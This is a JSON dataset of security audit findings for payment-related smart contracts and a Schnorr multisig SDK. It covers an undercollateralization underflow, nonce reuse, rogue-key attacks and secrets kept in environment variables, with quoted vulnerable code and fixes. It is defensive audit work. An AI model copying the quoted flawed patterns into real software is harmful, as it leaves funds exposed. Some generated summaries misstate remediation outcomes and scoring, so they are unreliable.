{
  "category": "Payments",
  "total_findings": 828,
  "fetched_at": "2026-01-29T12:59:51Z",
  "findings": [
    {
      "id": "63648",
      "title": "[M-01] Minting of `fToken` and `xToken` allowed during stability mode",
      "impact": "MEDIUM",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** Medium  \n\n**Likelihood:** Medium  \n\n## Description\n\nThe `Market.mint()` function mints both fToken and xToken [based on the current collateral ratio](https://github.com/RegnumAurumAcquisitionCorp/fx-contracts/blob/main/contracts/f(x)/math/FxLowVolatilityMath.sol#L293-L307).  \nIn the original Aladdin implementation, this function could be called only once. However, RegnumFx [removed this restriction](https://github.com/RegnumAurumAcquisitionCorp/fx-contracts/compare/bbb461cba879349c24c02d87872e93ec0a1a1975...f6e865df2dd46d67a49391d94e54b26e6a8af43c#diff-2c8d19ba3d13b72d110c2a9536e5e9915118ad919b38848357200e91afb683faL252), allowing it to be called multiple times.\n\nWhen the system enters stability mode, the collateral ratio has fallen below the defined safe threshold. This indicates that additional base tokens need to be deposited to restore the ratio.\n\nAllowing `mint()` during stability mode worsens the problem: each new mint increases the number of fTokens in circulation, which in turn raises the amount of base tokens required to bring the system back to a healthy state. As a result, recovery becomes more difficult, and the system may remain undercollateralized for longer.\n\nThe severity chosen for this issue is medium, because only whitelisted managers can use the function, and they are trusted entities that are not interested in making stablecoin depeg.\n\n## Recommendations\n\nRestrict `mint()` from being called when the system is in stability mode to prevent further dilution of collateralization and to simplify recovery.\n\n\n",
      "summary": "\nThe bug report discusses an issue with the `Market.mint()` function, which creates both fTokens and xTokens based on the current collateral ratio. The original implementation only allowed this function to be called once, but a recent change has removed this restriction. This means that the function can now be called multiple times, even during stability mode when the collateral ratio has fallen below a safe threshold. This makes it more difficult for the system to recover, as each new mint increases the amount of base tokens needed to restore the ratio. The report recommends restricting the function from being called during stability mode to prevent further problems. The severity of this issue is considered medium, as only trusted entities are able to use the function and they are not likely to intentionally harm the stability of the system.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "RWf(x)_2025-08-20",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/RWf(x)-security-review_2025-08-20.md",
      "github_link": "",
      "tags": [
        "Pre/Post Balance",
        "Precision Loss",
        "Protocol Reserve",
        "Deposit/Reward tokens",
        "MinOut/MaxIn Validation"
      ],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "63647",
      "title": "[H-01] Critical functions revert if system is undercollateralized",
      "impact": "HIGH",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n## Description\n\nThe internal function `Treasury._loadSwapState()` calculates the `xNav` as follows:\n\n```solidity\n_state.xNav = _state.baseSupply.mul(_state.baseNav).sub(_state.fSupply.mul(_state.fNav)).div(_state.xSupply);\n```\n\nThis is equivalent to:\n\n```js\n(baseSupplyNav - fSupplyNav) / xSupply\n```\n\nIn the case of the system being undercollateralized (`baseSupplyNav < fSupplyNav`), the calculation of `xNav` will revert due to subtraction underflow. All transactions involving the execution of `_loadSwapState()` will fail, including all operations that aim to raise the collateral ratio so that it can return to a healthy state.\n\nAs a result, the protocol will lack any mechanism to recover the collateralization ratio once it falls below 100%.\n\n### Proof of concept\n\nAdd the following code to the `Market.spec.ts` test file.\n\n```ts\n  context.only(\"audit\", async () => {\n    beforeEach(async () => {\n      await oracle.setPrice(100000000000); // $1000 with 8 decimals\n      await treasury.initializePrice();\n      await weth.deposit({ value: ethers.parseEther(\"10\") });\n      await weth.approve(market.getAddress(), MaxUint256);\n      await market.mint(ethers.parseEther(\"1\"), deployer.address, 0, 0);\n    });\n\n    it(\"reverts when collateral ratio is below 100%\", async () => {\n      // The system becomes undercollateralized\n      await oracle.setPrice(65000000000); // $650 with 8 decimals\n\n      // Manager tries to raise collateral ratio, but transactions revert\n      await expect(market.mintXToken(ethers.parseEther(\"1\"), signer.address, 0))\n        .to.revertedWith(\"SafeMath: subtraction overflow\");\n      await expect(market.addBaseToken(ethers.parseEther(\"1\"), signer.address, 0))\n        .to.revertedWith(\"SafeMath: subtraction overflow\");\n    });\n  });\n```\n\n## Recommendations\n\n```diff\n  function redeem(\n(...)\n-   _baseOut = _state.redeem(_fTokenIn, _xTokenIn);\n+   if (_state.xNav == 0) {\n+     require (_xTokenIn == 0, \"Undercollateralalized\");\n+     // only redeem fToken proportionally when under collateral.\n+     _baseOut = _fTokenIn.mul( _state.baseSupply).div(_state.fSupply);\n+   } else {\n+     _baseOut = _state.redeem(_fTokenIn, _xTokenIn);\n+   }\n\n(...)\n\n    if (_state.xSupply == 0) {\n        // no xToken, treat the nav of xToken as 1.0\n        _state.xNav = PRECISION;\n\t} else {\n-\t\t_state.xNav = _state.baseSupply.mul(_state.baseNav).sub(_state.fSupply.mul(_state.fNav)).div(_state.xSupply);\n+\t\tuint256 baseSupplyNav = _state.baseSupply.mul(_state.baseNav);\n+\t\tuint256 fSupplyNav = _state.fSupply.mul(_state.fNav);\n+\t\tif (baseSupplyNav <= fSupplyNav) {\n+\t\t\t_state.xNav = 0;\n+\t\t} else {\n+\t\t\t_state.xNav = baseSupplyNav.sub(fSupplyNav).div(_state.xSupply);\n+\t\t}\n\t}\n```\n\n\n\n",
      "summary": "\nThe bug report is about an error in the internal function `Treasury._loadSwapState()`, which is used to calculate the `xNav` value. This calculation can cause an underflow error, leading to the failure of all transactions involving this function. This can result in the system becoming undercollateralized and lacking a mechanism to recover the collateralization ratio. To fix this, the report recommends adding a condition to the `redeem()` function and changing the calculation of `xNav` to prevent the underflow error.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "RWf(x)_2025-08-20",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/RWf(x)-security-review_2025-08-20.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "52582",
      "title": "LIBRARY USAGE RECOMMENDATION",
      "impact": "LOW",
      "content": "##### Description\n\nThe external `schnorrkel` library was not being used. Instead, the *Schnorr* implementation was based on the `Schnorrkel` class defined within the project itself. `secp256k1` version `5.0.1` was being used.\n\nAs mentioned, `secp256k1` is being used for *Schnorr signatures*. Although functional, the `schnorrkel` library is often used with `Curve25519` for better multi-signature capabilities and robustness and security.\n\n**This is a point to review if the security standard of the project requires a higher level of security against quantum attacks.**\n\n### Impact\n\nWhile not a direct vulnerability, `secp256k1` has a weaker theoretical resistance to rogue attacks compared to `Curve25519`.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n* Consider migrating to the Curve25519 or a library specifically designed for Schnorr signatures such as `dalek` or `schnorrkel`.\n\n##### Remediation\n\n**ACKNOWLEDGED**: According to the **InFlux Technologies team**: \"Acknowledged, great suggestion. However, we won't be migrating to it now or anytime soon.\".\n\n##### Remediation Hash\n\n<https://github.com/RunOnFlux/account-abstraction/pull/17>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Account Abstraction Schnorr Signatures SDK",
      "source_link": "https://www.halborn.com/audits/influx-technologies/account-abstraction-schnorr-signatures-sdk",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "52581",
      "title": "POTENTIAL NONCE REUSAGE (KEY LEAKAGE RISK)",
      "impact": "LOW",
      "content": "##### Description\n\nThe `Schnorrkel` class stored nonces in a private field `#nonces`. Although *nonces* were cleared after use with the `clearNonces` method, the process relied on correct execution flow. If *nonces* were reused or not properly cleared, it may lead to private key leakage.\n\n### Impact\n\nReusing *nonces* in Schnorr signatures can completely reveal the private key due to the mathematical properties of the algorithm.\n\n##### Proof of Concept\n\n* `src/signers/Schnorrkel.ts`\n\n```\nexport class Schnorrkel {\n  #nonces: Nonces = {}\n\n  private _setNonce(privateKey: Buffer): string {\n    const { publicNonceData, privateNonceData, hash } = _generatePublicNonces(privateKey)\n\n    const mappedPublicNonce: PublicNonces = {\n      kPublic: new Key(Buffer.from(publicNonceData.kPublic)),\n      kTwoPublic: new Key(Buffer.from(publicNonceData.kTwoPublic)),\n    }\n\n    const mappedPrivateNonce: Pick<NoncePairs, \"k\" | \"kTwo\"> = {\n      k: new Key(Buffer.from(privateNonceData.k)),\n      kTwo: new Key(Buffer.from(privateNonceData.kTwo)),\n    }\n\n    this.#nonces[hash] = { ...mappedPrivateNonce, ...mappedPublicNonce }\n    return hash\n  }\n```\n\n```\nprivate clearNonces(privateKey: Key): void {\n    const x = privateKey.buffer\n    const hash = _hashPrivateKey(x)\n\n    // eslint-disable-next-line @typescript-eslint/no-dynamic-delete\n    delete this.#nonces[hash]\n  }\n```\n\n##### Score\n\nImpact: 2  \nLikelihood: 2\n\n##### Recommendation\n\n* Implement a nonce-tracking mechanism to prevent reuse explicitly, even if an error occurs during the signing process.\n* Consider enforcing a policy where each nonce is stored in a non-reusable bucket system.\n\n##### Remediation\n\n**SOLVED**: The **InFlux Technologies team** solved this issue by adding a final block with more cleaning and also a general bucket to remember all nonces used added as well.\n\n![](https://halbornmainframe.com/proxy/audits/images/67b7512252e021e002341e86)\n\n##### Remediation Hash\n\n<https://github.com/RunOnFlux/account-abstraction/pull/17>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Account Abstraction Schnorr Signatures SDK",
      "source_link": "https://www.halborn.com/audits/influx-technologies/account-abstraction-schnorr-signatures-sdk",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "52580",
      "title": "LACK OF KEY VALIDATION",
      "impact": "MEDIUM",
      "content": "##### Description\n\nThe method `getCombinedPublicKey` combined public keys without validating whether they were valid points on the curve. This may allow a *rogue-key* attack, where a malicious signer can construct a key pair that reveals the private key.\n\nIn a multi-signature scheme with aggregate signatures, several participants combine their public keys and collectively sign a message. The *rogue-key* attack occurs when a malicious attacker introduces a manipulated public key that invalidates the security of the scheme.\n\nIn this case, if a malicious actor managed to provide a rogue key during the execution process of the whole multi-signature scheme, the attack would be successful as there was no validation on the keys.\n\n### Impact\n\nA rogue participant could manipulate the key combination process, potentially revealing the private key of honest signers.\n\n* Total security breach: The attacker can sign alone on behalf of the entire group.\n* Unilateral control of funds: In the context of smart contracts or multi-sig wallets, this could allow the attacker to transfer funds without the cooperation of the rest of the participants.\n\n##### Proof of Concept\n\n* `src/signers/Schnorrkel.ts`\n\n```\nstatic getCombinedPublicKey(publicKeys: Key[]): Key {\n    if (publicKeys.length < 2) throw new Error(\"At least 2 public keys should be provided\")\n\n    const bufferPublicKeys = publicKeys.map((publicKey) => publicKey.buffer)\n    const L = _generateL(bufferPublicKeys)\n\n    const modifiedKeys = bufferPublicKeys.map((publicKey) => {\n      return secp256k1.publicKeyTweakMul(publicKey, _aCoefficient(publicKey, L))\n    })\n\n    return new Key(Buffer.from(secp256k1.publicKeyCombine(modifiedKeys)))\n  }\n```\n\n##### Score\n\nImpact: 3  \nLikelihood: 4\n\n##### Recommendation\n\n* Validate that all public keys are valid points on the `secp256k1` curve before combining.\n* Reject zero keys and invalid points explicitly.\n* Example Fix:\n\n```\nif (!secp256k1.publicKeyVerify(publicKey)) {\n   throw new Error(\"Invalid public key provided\");\n}\n```\n\nTo prevent a Rogue Key Attack:\n\n* **Explicit verification of public keys**: Each participant must validate the public keys of the others before combining them.\n* **Proof-of-knowledge protocols**: Implement a scheme such as *MuSig2* or *MuSig-DN*, which requires proof of knowledge of the associated private key before aggregation.\n\n##### Remediation\n\n**SOLVED**: The **InFlux Technologies team** followed Halborn recommendations to solve this issue.\n\n![](https://halbornmainframe.com/proxy/audits/images/67b74f6640bf90b75e6f4f6b)\n\n##### Remediation Hash\n\n<https://github.com/RunOnFlux/account-abstraction/pull/17>",
      "summary": "\nThe method `getCombinedPublicKey` in the code did not check if the public keys were valid, making it vulnerable to a rogue-key attack. This means that a malicious attacker could manipulate the key combination process and potentially reveal the private key of honest signers. This could lead to a total security breach and unilateral control of funds. To fix this, the developers should validate all public keys before combining them and implement schemes like MuSig2 or MuSig-DN which require proof of knowledge of the private key before aggregation. The bug has been fixed by the InFlux Technologies team following recommendations from the security company Halborn.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Account Abstraction Schnorr Signatures SDK",
      "source_link": "https://www.halborn.com/audits/influx-technologies/account-abstraction-schnorr-signatures-sdk",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "52579",
      "title": "UNSPECIFIED DEFAULT HASH FUNCTION",
      "impact": "MEDIUM",
      "content": "##### Description\n\nThe optional parameter `hashFn` defaulted to `null`, relying on external callers to define the hash function, which introduced a cryptographic risk of using an insecure hash.\n\n### Impact\n\nIf an insecure hash function (e.g., MD5) is provided or `null` is used, it can compromise the integrity of the signatures.\n\n##### Proof of Concept\n\nListed below, there are some examples of code snippets where the Hash Function was set to `null` by default.\n\n* `src/signers/SchnorrSigner.ts`\n\n```\nsignMessage(msg: string, hashFn: HashFunction | null = null): SignatureOutput {\n    return Schnorrkel.sign(this.#privateKey, msg, hashFn)\n  }\n```\n\n* `src/signers/Schnorrkel.ts`\n\n```\nmultiSigSign(\n    privateKey: Key,\n    msg: string,\n    publicKeys: Key[],\n    publicNonces: PublicNonces[],\n    hashFn: HashFunction | null = null\n  ): SignatureOutput {\n    const combinedPublicKey = Schnorrkel.getCombinedPublicKey(publicKeys)\n    const mappedPublicNonce = this.getMappedPublicNonces(publicNonces)\n    const mappedNonces = this.getMappedNonces()\n\n    const musigData = _multiSigSign(\n      mappedNonces,\n      combinedPublicKey.buffer,\n      privateKey.buffer,\n      msg,\n      publicKeys.map((key) => key.buffer),\n      mappedPublicNonce,\n      hashFn\n    )\n```\n\n* `src/signers/Schnorrkel.ts`\n\n```\nstatic verify(\n    signature: SchnorrSignature,\n    msg: string,\n    finalPublicNonce: FinalPublicNonce,\n    publicKey: Key,\n    hashFn: HashFunction | null = null\n  ): boolean {\n    return _verify(signature.buffer, msg, finalPublicNonce.buffer, publicKey.buffer, hashFn)\n  }\n```\n\n##### Score\n\nImpact: 3  \nLikelihood: 4\n\n##### Recommendation\n\n* Set a cryptographically secure default hash function, such as SHA-256:\n\n```\nconst defaultHashFunction = (msg: string) => createHash(\"sha256\").update(msg).digest();\n```\n\n##### Remediation\n\n**SOLVED**: The **InFlux Technologies team** solved this issue by removing the null value and also by adding the \"`_hashMessage`\" (solidityPackedKeccak256) as default.\n\n![](https://halbornmainframe.com/proxy/audits/images/67b74dc040bf90b75e6f23c5)\n\n##### Remediation Hash\n\n<https://github.com/RunOnFlux/account-abstraction/pull/17>",
      "summary": "\nThe bug report discusses a potential issue with the default hash function in the `SchnorrSigner` and `Schnorrkel` classes. These classes rely on an external caller to define the hash function, which could potentially introduce a cryptographic risk if an insecure hash function is used. This could compromise the integrity of the signatures. The report provides code examples where the hash function is set to `null` by default, and recommends setting a cryptographically secure default hash function, such as SHA-256. The bug has been solved by the InFlux Technologies team by removing the null value and adding a soliditPackedKeccak256 as the default hash function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Account Abstraction Schnorr Signatures SDK",
      "source_link": "https://www.halborn.com/audits/influx-technologies/account-abstraction-schnorr-signatures-sdk",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "52578",
      "title": "HARDCODED TRANSACTION COST",
      "impact": "MEDIUM",
      "content": "##### Description\n\nThe `initTransactionCost` variable was hardcoded in the source code examples, making it static and unresponsive to real-time gas price fluctuations on the blockchain network. This approach did not account for dynamic network conditions, potentially leading to incorrect transaction execution or unexpected failures due to insufficient gas provision.\n\n### Impact\n\nThe major security concern about this issue was the use of a hardcoded transaction value (`initTransactionCost`), which could lead to incorrect execution or gas manipulation. This value must be calculated dynamically.\n\n* **Economic Denial of Service (EDoS):** If gas prices surge unexpectedly, a hardcoded gas limit may lead to transaction failures or delays.\n* **Manipulation Risk:** Attackers could deliberately increase network congestion, forcing the hardcoded value to be insufficient, causing critical operations to fail.\n* **Reduced Flexibility:** The contract cannot adapt to real-time gas price changes, increasing operational risk.\n\nThis vulnerability severity was lowered from HIGH to MEDIUM because all the hardcoded values for the transaction cost were found in the `examples` folder of the project. However, this bad practice should be removed, according to the best security practices.\n\n##### Proof of Concept\n\n* `examples/account-deployment/user-operation-init-code-deployment.ts`\n\n```\nconst smartAccountAdddress = await predictAccountAddrOnchain(factoryAddress, combinedAddresses, salt, provider)\n  console.log(\"Smart Account Address:\", smartAccountAdddress)\n\n  const initTransactionCost = parseUnits(\"0.05\", 18)\n  const addBalanceToSmartAccountTransaction = await wallet.sendTransaction({ to: smartAccountAdddress, value: initTransactionCost })\n  await addBalanceToSmartAccountTransaction.wait()\n```\n\n* `examples/account-deployment/user-operation-init-code-deployment.ts`\n\n```\nconst smartAccountAdddress = await predictAccountAddrOnchain(factoryAddress, combinedAddresses, salt, provider)\n  console.log(\"Smart Account Address:\", smartAccountAdddress)\n\n  const initTransactionCost = parseUnits(\"0.05\", 18)\n  const addBalanceToSmartAccountTransaction = await wallet.sendTransaction({ to: smartAccountAdddress, value: initTransactionCost })\n  await addBalanceToSmartAccountTransaction.wait()\n```\n\n* `examples/sign_3_of_3/sign-3_of_3.ts`\n\n```\n/**\n   * Prefund smart account\n   */\n  const initTransactionCost = parseUnits(\"0.05\", 18)\n  const addBalanceToSmartAccountTransaction = await wallet.sendTransaction({ to: multiSigSmartAccount.address, value: initTransactionCost })\n  await addBalanceToSmartAccountTransaction.wait()\n```\n\n* `examples/user-operation/transfer-erc20/transfer-erc20.ts`\n\n```\n/**\n  * Prefund smart account\n  */\n const initTransactionCost = parseUnits(\"0.05\", 18)\n const addBalanceToSmartAccountTransaction = await wallet.sendTransaction({ to: multiSigSmartAccount.address, value: initTransactionCost })\n await addBalanceToSmartAccountTransaction.wait()\n```\n\n* `examples/user-operation/transfer-native/transfer-native.ts`\n\n```\n/**\n   * Prefund smart account\n   */\n  const initTransactionCost = parseUnits(\"0.06\", 18)\n  const addBalanceToSmartAccountTransaction = await wallet.sendTransaction({ to: multiSigSmartAccount.address, value: initTransactionCost })\n  await addBalanceToSmartAccountTransaction.wait()\n```\n\n##### Score\n\nImpact: 4  \nLikelihood: 2\n\n##### Recommendation\n\nSimilarly to other functions, consider relying on calls to specific contracts to determine the gas estimation. Alternatively, consider using APIs (e.g., blockchain node RPC endpoints or third-party services) as this is the more common approach for gas estimation.\n\n* Replace the hardcoded `initTransactionCost` with a dynamic calculation based on the current gas price using on-chain data or a reliable oracle.\n* Implement a buffer margin to account for sudden price spikes in congested conditions.\n* Test the contract under varying gas price scenarios to ensure resilience.\n\n##### Remediation\n\n**NOT APPLICABLE**: Finally agreed with the **InFlux Technologies team** that this issue was not applicable.\n\n##### Remediation Hash\n\n<https://github.com/RunOnFlux/account-abstraction/pull/17>",
      "summary": "\nThe report highlights a bug in the source code examples where the `initTransactionCost` variable is hardcoded, making it unresponsive to real-time gas price fluctuations on the blockchain network. This can lead to incorrect transaction execution or unexpected failures. The severity of this issue was lowered from HIGH to MEDIUM as it was found in the `examples` folder, but it is still a bad practice that should be removed. The report provides proof of concept code and recommends replacing the hardcoded value with a dynamic calculation based on current gas prices. The team has agreed that this issue is not applicable and no remediation is needed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Account Abstraction Schnorr Signatures SDK",
      "source_link": "https://www.halborn.com/audits/influx-technologies/account-abstraction-schnorr-signatures-sdk",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "52577",
      "title": "VULNERABLE THIRD-PARTY DEPENDENCIES",
      "impact": "MEDIUM",
      "content": "##### Description\n\nThe scoped repository used multiple third-party dependencies. Several of the assessed dependencies had public-known vulnerabilities, many of them with CRITICAL or HIGH severity, that may pose a high risk to the global application security level.\n\n### Impact\n\nUsing vulnerable third-party libraries can result in security vulnerabilities in the project that can be exploited by attackers. This can result in data breaches, theft of sensitive information, and other security issues.\n\n##### Proof of Concept\n\n* `snyk test --all-projects` command output.\n\n![](https://halbornmainframe.com/proxy/audits/images/67b752d940bf90b75e6fc69f)\n\n##### Score\n\nImpact: 4  \nLikelihood: 3\n\n##### Recommendation\n\nUpdate all affected packages to its latest version.\n\nIt is strongly recommended to perform an automated analysis of the dependencies from the birth of the project and if they contain any security issues. Developers should be aware of this and apply any necessary mitigation measures to protect the affected application.\n\n##### Remediation\n\n**RISK ACCEPTED**: According to the **InFlux Technologies team**, they wanted to accept the risk of this issue.\n\n##### Remediation Hash\n\n<https://github.com/RunOnFlux/account-abstraction/pull/17>",
      "summary": "\nThis bug report is about a problem with a repository that uses third-party dependencies. These dependencies have known security vulnerabilities that could be exploited by attackers, potentially leading to data breaches and other security issues. The report suggests updating all affected packages to their latest versions and performing an automated analysis of dependencies for any security issues. The team responsible for the repository has chosen to accept the risk of this issue. A link to the pull request for remediation is provided.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Account Abstraction Schnorr Signatures SDK",
      "source_link": "https://www.halborn.com/audits/influx-technologies/account-abstraction-schnorr-signatures-sdk",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "52576",
      "title": "SENSITIVE INFORMATION IN ENV VARS",
      "impact": "MEDIUM",
      "content": "##### Description\n\nSensitive information, such as API keys and private keys, were being stored directly in environmental variables.\n\nWhile environment variables are commonly used to configure applications, storing highly sensitive data in them poses security risks.\n\nUnauthorized users or malicious insiders who gain access to the system or CI/CD pipeline may retrieve these sensitive variables, leading to potential data leaks, unauthorized access to external services, and compromised application security.\n\nThe repository code used sensitive private keys stored in a `.env` file, which are accessed programmatically via `process.env.PRIVATE_KEY` clauses or similar.\n\nSince the repository is public, there is also a risk that developers may inadvertently copy these sensitive values directly into production environments. This practice can lead to unauthorized access and compromise of digital assets. If environment variables are not properly managed or are leaked, it can result in exposure of private keys.\n\n### Impact\n\nStoring private keys or other sensitive information inside environment variables can lead to severe security risks in case of exposure, such as:\n\n* Unauthorized access to blockchain wallets or smart contract deployments.\n* Financial loss due to stolen assets.\n* Compromise of cryptographic keys, leading to broader security breaches.\n\n##### Proof of Concept\n\nListed below are some examples where sensitive information was being stored inside environmental variables.\n\n* `examples/account-deployment/factory-create-account-method-call-deployment.ts`\n\n```\nasync function factoryCallCreateSmartAccount() {\n  const privKey1 = process.env.PRIVATE_KEY as Hex\n  const schnorrSigner1 = createSchnorrSigner(privKey1)\n  const publicKey1 = schnorrSigner1.getPubKey()\n\n  let privKey2\n  do privKey2 = randomBytes(32)\n  while (!secp256k1.privateKeyVerify(privKey2))\n  const schnorrSigner2 = createSchnorrSigner(privKey2)\n  const publicKey2 = schnorrSigner2.getPubKey()\n\n  const salt = \"this is salt\"\n\n  const publicKeys = [publicKey1, publicKey2]\n\n  const combinedAddresses = getAllCombinedAddrFromKeys(publicKeys, 2)\n\n  const provider = new JsonRpcProvider(process.env.ALCHEMY_RPC_URL)\n  const wallet = new Wallet(process.env.PRIVATE_KEY, provider)\n\n  const factoryAddress = deployments[CHAIN.id]?.MultiSigSmartAccountFactory\n\n  const smartAccountAddress = await predictAccountAddrOnchain(factoryAddress, combinedAddresses, salt, provider)\n  console.log(\"Smart Account Address:\", smartAccountAddress)\n```\n\n* `examples/sign_3_of_3/sign-3_of_3.ts`\n\n```\nasync function main() {\n  /**\n   * Wallet to cover initial transaction costs/prefund smart account\n   */\n  const provider = new JsonRpcProvider(process.env.ALCHEMY_RPC_URL)\n  const wallet = new Wallet(process.env.PRIVATE_KEY, provider)\n\n  /**\n   * Precondition:\n   * 3 Participants sharing they Public Key's\n   */\n\n  /**\n   * Multi Sig participant #1\n   */\n  const privKey1 = process.env.PRIVATE_KEY as Address\n  const schnorrSigner1 = createSchnorrSigner(privKey1)\n\n  const publicKey1 = schnorrSigner1.getPubKey()\n```\n\n* `examples/user-operation/transfer-native/transfer-native.ts`\n\n```\nasync function main() {\n  /**\n   * Wallet to cover initial transaction costs/prefund smart account\n   */\n  const provider = new JsonRpcProvider(process.env.ALCHEMY_RPC_URL)\n  const wallet = new Wallet(process.env.PRIVATE_KEY, provider)\n\n  /**\n   * Requirements\n   * Eth/Matic: 0.06\n   */\n\n  const walletBalance = await provider.getBalance(wallet.address)\n  if (walletBalance < parseEther(\"0.06\")) throw new Error(\"Not enough native assets\")\n\n  const privKey1 = process.env.PRIVATE_KEY as Address\n  const schnorrSigner1 = createSchnorrSigner(privKey1)\n\n  const publicKey1 = schnorrSigner1.getPubKey()\n```\n\n##### Score\n\nImpact: 4  \nLikelihood: 3\n\n##### Recommendation\n\n* **Remove sensitive keys** from `.env` files in public repositories.\n* **Use environment-specific secrets management tools** (e.g., AWS Secrets Manager, HashiCorp Vault or hardware key management (HSM)).\n* **Ensure the** `.env.example` file includes placeholders or comments explaining proper key usage, without actual secrets.\n* **Implement CI/CD checks** to prevent committing sensitive data to public repositories.\n\n##### Remediation\n\n**RISK ACCEPTED**: According to the **InFlux Technologies team**, they wanted to accept the risk of this issue.\n\n##### Remediation Hash\n\n<https://github.com/RunOnFlux/account-abstraction/pull/17>",
      "summary": "\nThe bug report describes a security vulnerability in which sensitive information, such as API keys and private keys, are being stored directly in environmental variables. This poses a risk as unauthorized users or malicious insiders could potentially access these variables and compromise the security of the application. The report provides examples of where this issue was found in the code and recommends removing the sensitive keys from the `.env` file and using environment-specific secrets management tools. The team has accepted the risk but has implemented measures to prevent committing sensitive data to public repositories.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Account Abstraction Schnorr Signatures SDK",
      "source_link": "https://www.halborn.com/audits/influx-technologies/account-abstraction-schnorr-signatures-sdk",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "52575",
      "title": "LACK OF EXTERNAL CALLS VALIDATION",
      "impact": "HIGH",
      "content": "##### Description\n\nNon-validated external calls occur when a function invokes an external contract without verifying the return value or handling potential errors.\n\nSeveral external calls were detected without proper validation.\n\n### Impact\n\nThis can lead to reentrancy attacks or unexpected side effects if the external call fails or returns an unexpected result, directly causing a potential impact in the availability or integrity of the environment.\n\n##### Proof of Concept\n\nListed below, there are some examples of unvalidated calls that may fail or cause an unconsistent or unexpected behavior of the application execution flow.\n\n* `examples/account-address/account_address.ts`\n\n```\nasync function getAddressAlchemyAASDK(combinedAddresses: Address[], salt: string) {\n  const rpcUrl = process.env.ALCHEMY_RPC_URL\n  const transport = http(rpcUrl)\n  const multiSigSmartAccount = await createMultiSigSmartAccount({\n    transport,\n    chain: CHAIN,\n    combinedAddress: combinedAddresses,\n    salt: saltToHex(salt),\n    entryPoint: getEntryPoint(CHAIN),\n  })\n\n  return multiSigSmartAccount.address\n}\n\n\n```\n\n* `src/helpers/create2.ts`\n\n```\nexport async function getAccountImplementationAddress(factoryAddress: string, ethersSignerOrProvider: Signer | Provider): Promise<string> {\n  const smartAccountFactory = new ethers.Contract(factoryAddress, MultiSigSmartAccountFactory_abi, ethersSignerOrProvider)\n  const accountImplementation = await smartAccountFactory.accountImplementation()\n  return accountImplementation\n}\n```\n\n* `src/helpers/factory-helpers.ts`\n\n```\nexport async function predictAccountAddress(\n  factoryAddress: Hex,\n  signer: Signer,\n  combinedPubKeys: string[],\n  salt: string\n): Promise<`0x${string}`> {\n  const smartAccountFactory = new ethers.Contract(factoryAddress, MultiSigSmartAccountFactory_abi, signer)\n  const saltHash = ethers.keccak256(ethers.toUtf8Bytes(salt))\n  const predictedAccount = await smartAccountFactory.getAccountAddress(combinedPubKeys, saltHash)\n  return predictedAccount as Hex\n}\n```\n\n* `examples/account-deployment/user-operation-init-code-deployment.ts`\n\n```\nconst factoryAddress = deployments[CHAIN.id]?.MultiSigSmartAccountFactory\n\n  const smartAccountAdddress = await predictAccountAddrOnchain(factoryAddress, combinedAddresses, salt, provider)\n  console.log(\"Smart Account Address:\", smartAccountAdddress)\n\n  const initTransactionCost = parseUnits(\"0.05\", 18)\n  const addBalanceToSmartAccountTransaction = await wallet.sendTransaction({ to: smartAccountAdddress, value: initTransactionCost })\n  await addBalanceToSmartAccountTransaction.wait()\n\n  const transport = http(process.env.ALCHEMY_RPC_URL)\n  const multiSigSmartAccount = await createMultiSigSmartAccount({\n    transport,\n    chain: CHAIN,\n    combinedAddress: combinedAddresses,\n    salt: saltToHex(salt),\n    entryPoint: getEntryPoint(CHAIN),\n  })\n```\n\n##### Score\n\nImpact: 5  \nLikelihood: 3\n\n##### Recommendation\n\n* Implement proper error handling and validation for external calls.\n* Use `try/catch` blocks to handle exceptions and log errors appropriately.\n* Ensure the external contract being called follows best practices for reentrancy protection.\n\n##### Remediation\n\n**RISK ACCEPTED**: According to the **InFlux Technologies team**, they wanted the library to throw the exact error message. Handling of error and validation should happen on a client using the library.\n\n##### Remediation Hash\n\n<https://github.com/RunOnFlux/account-abstraction/pull/17>",
      "summary": "\nThis bug report discusses the issue of non-validated external calls in a code library. This means that the code is making calls to external contracts without properly verifying the return value or handling any potential errors. This can lead to security vulnerabilities and unexpected behavior in the application. The report provides examples of unvalidated calls and suggests implementing proper error handling and validation, as well as ensuring the external contract follows best practices for reentrancy protection. The report also includes a recommendation from the InFlux Technologies team to handle errors and validation on the client side, and a link to a pull request for remediation. It rates the impact as 5 out of 10 and the likelihood as 3 out of 10.",
      "quality_score": 5,
      "rarity_score": 4,
